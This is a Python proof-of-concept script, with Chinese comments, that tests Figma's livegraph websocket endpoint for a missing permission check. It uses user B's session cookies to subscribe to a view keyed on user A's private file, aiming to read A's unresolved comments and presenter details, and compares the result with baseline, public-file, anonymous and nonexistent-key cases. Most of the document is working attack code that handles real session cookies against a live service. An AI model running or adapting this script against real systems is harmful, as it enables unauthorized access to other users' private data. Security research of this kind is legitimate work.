# -*- coding: utf-8 -*-
"""对照判定: DesktopLiveTabBarView (filePrototypeInfo 入口, 非 fileV2)
攻击假设: 入口缺权限校验 -> B 用 A 私有文件 key 读出未解决评论 + 演示者信息
基线: A→自己文件(应有权限) vs B→A文件(攻击) vs B→公开文件(阳性) vs 匿名→A文件 vs 不存在key(空壳)
"""
import sys, json, io, asyncio, time, urllib.parse, uuid
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
FB_FILE = "ucha7bf05fJ81CJZVoruo0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)

OUT = io.open("_ws_prototype_comment_probe_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


async def run_case(label, view, args, uid, ck, fk):
    frames = await sub(view, args, fk, uid, ck, wait=8)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    import re
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    if has_data:
        tag = "⭐返回数据"
    elif m:
        tag = f"⚠{m.group(1)} {m.group(2)[:50]}"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:3000]}\n")
        if has_data:
            print(f"  🖼 {f[:1600]}")


async def main():
    v = "DesktopLiveTabBarView"
    print("=== DesktopLiveTabBarView (filePrototypeInfo 入口) ===")
    await run_case("基线A→自己文件", v, {"fileKey": A_MAKE, "__requestId": str(uuid.uuid4())}, A_UID, ABS_A, A_MAKE)
    await asyncio.sleep(0.4)
    await run_case("攻击B→A私有文件", v, {"fileKey": A_MAKE, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B, A_MAKE)
    await asyncio.sleep(0.4)
    await run_case("阳性B→公开文件", v, {"fileKey": FB_FILE, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B, FB_FILE)
    await asyncio.sleep(0.4)
    await run_case("匿名→A私有文件", v, {"fileKey": A_MAKE, "__requestId": str(uuid.uuid4())}, "0", "", A_MAKE)
    await asyncio.sleep(0.4)
    await run_case("空壳对照 不存在key", v, {"fileKey": "ZZZZZZZZZZZZZZZZZZZZ", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B, A_MAKE)
    await asyncio.sleep(0.4)

    OUT.close()
    print("\nDONE")


asyncio.run(main())
